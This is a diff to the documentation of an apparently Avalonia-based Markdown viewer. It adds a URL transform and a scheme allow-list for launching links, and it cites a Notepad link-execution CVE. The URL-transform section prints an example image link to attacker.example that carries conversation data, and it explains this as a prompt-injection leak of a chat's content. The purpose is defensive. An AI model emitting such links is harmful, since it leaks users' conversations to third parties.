@@ -6,6 +6,7 @@
 |----------|------|---------|-------------|
 | `Markdown` | `string?` | `null` | The markdown text to render. Setting this triggers a full re-render. |
 | `Source` | `Uri?` | `null` | URI of a markdown document to load and render. Takes precedence over `Markdown` when set. Supports `avares://`, `file://`, and `http/https`, plus whatever `ResourceResolver` opens. |
+| `UrlTransform` | `MarkdownUrlTransform?` | `null` | Rewrites or drops the URL of each link and image while the document renders. `null` falls back to `MarkdownViewerDefaults.UrlTransform`. See [URL transform](#url-transform). |
 | `ResourceResolver` | `IResourceResolver?` | `null` | Opens the document of `Source` and the document's images before the viewer's own loading, e.g. from a zip archive or an authenticated server. `null` falls back to `MarkdownViewerDefaults.ResourceResolver`. See [Resource resolver](#resource-resolver). |
 | `Pipeline` | `MarkdownPipeline?` | `null` | The Markdig pipeline. `null` falls back to `MarkdownViewerDefaults.Pipeline`, or the built-in default (`UseGitHubExtensions`). |
 | `BaseUri` | `Uri?` | `null` | Base URI for resolving relative links and image paths. When `Source` is set and `BaseUri` is not, it is inferred automatically from the source location. |
@@ -254,8 +255,10 @@ MarkdownViewerDefaults.Extensions.AddMermaid();
 MarkdownViewerDefaults.Extensions.AddFenceRenderer("chart", (code, info) => new MyChart(code));
 ```
 
-`MarkdownViewerDefaults.ResourceResolver` likewise applies to every viewer that does not set its own
-[`ResourceResolver`](#resource-resolver).
+`MarkdownViewerDefaults.ResourceResolver` and `MarkdownViewerDefaults.UrlTransform` likewise apply to
+every viewer that does not set its own [`ResourceResolver`](#resource-resolver) or
+[`UrlTransform`](#url-transform), and `MarkdownViewerDefaults.LaunchableLinkSchemes` lists the
+[link schemes the viewer opens by itself](#links-the-viewer-opens).
 
 **Priority rules:**
 
@@ -422,7 +425,8 @@ viewer.Markdown = File.ReadAllText("README.md");
 
 By default, clicking an external link opens it with the platform's `ILauncher`
 (the OS default browser/app on desktop, an intent on mobile, a new tab on
-WebAssembly) — no application code required.
+WebAssembly) — no application code required. Only `http`, `https` and `mailto` links are opened
+this way; see [Links the viewer opens](#links-the-viewer-opens).
 
 `LinkClicked` is an Avalonia **routed event** that bubbles up the visual tree, raised
 before that default launch happens. Subscribe to override the behavior for specific
@@ -452,6 +456,81 @@ MarkdownViewer.LinkClickedEvent.AddClassHandler<MarkdownViewer>((sender, e) =>
 ```
 
 The event is raised for all hyperlinks, including anchor links (`#heading`). In-document anchor links are handled automatically by the viewer before raising the event — navigation happens regardless of whether you subscribe, and the default external-link launch never runs for them.
+
+### Links the viewer opens
+
+The launcher hands a URL to whatever the operating system registered for its scheme. For a
+`file:` link that can be a program, and installer or settings protocols (`ms-appinstaller:`,
+`ms-settings:`, …) do more than show a page: that is how a crafted link in a Markdown file could
+run code in Windows Notepad ([CVE-2026-20841](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)).
+So the viewer launches only the schemes in `MarkdownViewerDefaults.LaunchableLinkSchemes`: `http`,
+`https` and `mailto` by default, compared without regard to case.
+
+A link of any other scheme (or a relative one) still raises `LinkClicked`, so the application can
+open its own links:
+
+```csharp
+viewer.LinkClicked += (_, e) =>
+{
+    if (e.Url.StartsWith("myapp://"))
+    {
+        Router.Navigate(e.Url);
+        e.Handled = true;
+    }
+};
+```
+
+Add a scheme to the set only when the documents shown are trusted:
+
+```csharp
+MarkdownViewerDefaults.LaunchableLinkSchemes.Add("file"); // e.g. a viewer of the user's own notes
+```
+
+## URL transform
+
+`UrlTransform` rewrites or drops the URL of every link and image while the document renders. It gets
+the URL resolved against [`BaseUri`](#baseuri) (or the folder of `Source`), and whether it is the
+target of a link or the address of an image, and returns the URL to use, or `null` to drop it:
+
+- A dropped link renders as its text alone, with its formatting but no link: nothing to click, no
+  Tab stop.
+- A dropped image shows its [placeholder](#images-that-fail-to-load) with its alt text, and is never
+  loaded.
+
+This matters most for text the application does not control, such as a language model's answers. A
+document can make the viewer fetch any image URL it likes, and the request itself can carry data:
+`![](https://attacker.example/pixel.png?q=<something from the conversation>)` is a known way of
+leaking a chat's content through a prompt injection. Allow images from known hosts only:
+
+```csharp
+viewer.UrlTransform = (url, kind) =>
+    kind == MarkdownUrlKind.Image
+    && !(Uri.TryCreate(url, UriKind.Absolute, out var uri) && uri.Host == "cdn.myapp.example")
+        ? null
+        : url;
+```
+
+Or rewrite them, e.g. through an image proxy:
+
+```csharp
+viewer.UrlTransform = (url, kind) => kind == MarkdownUrlKind.Image
+    ? "https://proxy.myapp.example/?url=" + Uri.EscapeDataString(url)
+    : url;
+```
+
+- Links include autolinks (an e-mail one comes as `mailto:…`), HTML `<a href>` and video links;
+  images include HTML `<img src>` and video thumbnails. A video whose link is dropped shows the
+  image placeholder.
+- Same-document anchors (`#heading`) and footnote links never reach the transform.
+- A URL stays relative when there is neither `BaseUri` nor `Source` to resolve it against.
+- While [streaming](streaming.md), the links and images of the block still being written
+  ([provisional](streaming.md#provisional-rendering)) are not given to the transform: it is called
+  once their block is complete.
+- Setting `UrlTransform` re-renders the document. `MarkdownViewerDefaults.UrlTransform` applies to
+  every viewer that has none of its own.
+
+The transform decides what the document shows; [`LaunchableLinkSchemes`](#links-the-viewer-opens)
+still decides which of the remaining links the viewer opens by itself.
 
 ## Interactive task lists
 
